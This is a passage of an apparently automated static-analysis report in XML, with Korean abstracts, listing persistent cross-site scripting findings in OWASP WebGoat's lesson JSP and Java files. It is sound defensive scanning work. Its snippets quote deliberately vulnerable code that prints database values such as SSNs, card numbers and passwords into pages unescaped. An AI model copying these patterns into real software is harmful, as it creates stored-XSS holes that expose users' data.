                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.FIRST_NAME%&gt;" type="text" value="&lt;%=employee.getFirstName()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>194</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="95FD742CA47B8070F0C8858F52080B67" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 103 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>103</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;textarea name="&lt;%=SQLInjection.DISCIPLINARY_NOTES%&gt;"  cols="16" rows="3" class="lesson_text_db" &gt;&lt;%=employee.getDisciplinaryActionNotes()%&gt;&lt;/textarea&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F2B33550DA9C5D39EAE236528CDF3C47" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getFirstName()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0E13349F0199313D11F5B53AEB3AA23C" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.FIRST_NAME%&gt;" type="text" value="&lt;%=employee.getFirstName()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="78E439BD646F89B4CB129E8C9AF39CB4" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 54 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="77F9A93C63D128ECBF6624914A783970" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 46 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>46</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.START_DATE%&gt;" type="text" value="&lt;%=employee.getStartDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D5E3ADDD4299835DAD22121480CD12E6" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 41 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>41</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.PHONE_NUMBER%&gt;" type="text" value="&lt;%=employee.getPhoneNumber()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A678ED7014FF7A12DB2660BBE42C8550" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 67 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="DB15B1C839F82C90CA195C96AC0ADE53" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 9 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>9</LineStart>
<Snippet>//	int myUserId = getIntSessionAttribute(webSession, "RoleBasedAccessControl." + RoleBasedAccessControl.USER_ID);
%&gt;
		&lt;div class="lesson_title_box"&gt;&lt;strong&gt;Welcome Back &lt;/strong&gt;&lt;span class="lesson_text_db"&gt;&lt;%=webSession.getUserNameInLesson()%&gt;&lt;/span&gt; - View Profile Page&lt;/div&gt;
		&lt;div class="lesson_text"&gt;
				&lt;Table&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>203</LineStart>
<Snippet>			{
				Statement answer_statement = WebSession.getConnection(s).createStatement( ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
				ResultSet answer_results = answer_statement.executeQuery( query );
				if (answer_results.next())
					name = answer_results.getString("first_name");</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="36DDB67DE2A0F70442FBABDEF545FEBC" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 47 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>47</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getStartDate()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="2D4EF659D0215A07490C3EB6850C7716" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 80 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>80</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getPersonalDescription()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="69A04E6481CA87F7AF690801B6405F5E" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/Login.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>						EmployeeStub stub = (EmployeeStub) i.next();
					%&gt;
			      	&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName() + " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;
					&lt;%}%&gt;
	                &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>236</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="CEA7B9B0ED69C339049520C67E93E367" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 80 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>80</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getPersonalDescription()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="DFBCFFBD3519668DCBC0A9405DECFDA0" ruleID="94B3FB0E-4AED-4006-9CDD-B2B1C13747EE">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>DatabaseUtilities.java의 writeTable() 메서드가 154 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>DatabaseUtilities.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/DatabaseUtilities.java</FilePath>
<LineStart>154</LineStart>
<Snippet>		for (int i = 1; i &lt; (numColumns + 1); i++)
		{
		    row.addElement(new TD(results.getString(i).replaceAll(" ",
			    "&amp;nbsp;")));
		}</Snippet>
<TargetFunction>org.apache.ecs.html.TD.TD()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewDatabase.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/admin/ViewDatabase.java</FilePath>
<LineStart>89</LineStart>
<Snippet>			ResultSet.TYPE_SCROLL_INSENSITIVE,
			ResultSet.CONCUR_READ_ONLY);
		ResultSet results = statement.executeQuery(sqlStatement
			.toString());
</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="5C02ADF99DC786197ED659E35F821D1D" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 21 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>21</LineStart>
<Snippet>						Last Name:					&lt;/TD&gt;
					&lt;TD width="196"&gt;
					 	&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.LAST_NAME%&gt;" type="text" value="&lt;%=employee.getLastName()%&gt;"/&gt;
				  &lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D700032EF00A754CD4C4AF020CFCADC2" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 94 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>94</LineStart>
<Snippet>							EmployeeStub stub = (EmployeeStub) i.next();
								%&gt;
								&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()%&gt;&lt;/option&gt;
						&lt;%}%&gt;
						&lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1ADC4933B860D72293036A75AF4D12F5" ruleID="94B3FB0E-4AED-4006-9CDD-B2B1C13747EE">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>BackDoors.java의 concept1() 메서드가 128 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>BackDoors.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/BackDoors.java</FilePath>
<LineStart>128</LineStart>
<Snippet>		    tr.addElement(new TD(rs.getString("password")));
		    tr.addElement(new TD(rs.getString("ssn")));
		    tr.addElement(new TD(rs.getString("salary")));
		    t.addElement(tr);
		    ec.addElement(t);</Snippet>
<TargetFunction>org.apache.ecs.html.TD.TD()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>BackDoors.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/BackDoors.java</FilePath>
<LineStart>113</LineStart>
<Snippet>		}

		ResultSet rs = statement.executeQuery(arrSQL[0]);
		if (rs.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="9223FDCC213FC7E5C08C51590BB41AC7" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 41 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>41</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.PHONE_NUMBER%&gt;" type="text" value="&lt;%=employee.getPhoneNumber()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="FC40F6F9265DC98B0E30A1183C1B2B62" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 103 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>103</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;textarea name="&lt;%=CrossSiteScripting.DISCIPLINARY_NOTES%&gt;" cols="16" rows="3" class="lesson_text_db" &gt;&lt;%=employee.getDisciplinaryActionNotes()%&gt;&lt;/textarea&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="AA5CCB68A0A42900880FFBE15B45DAFE" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 103 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>103</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;textarea name="&lt;%=SQLInjection.DISCIPLINARY_NOTES%&gt;"  cols="16" rows="3" class="lesson_text_db" &gt;&lt;%=employee.getDisciplinaryActionNotes()%&gt;&lt;/textarea&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
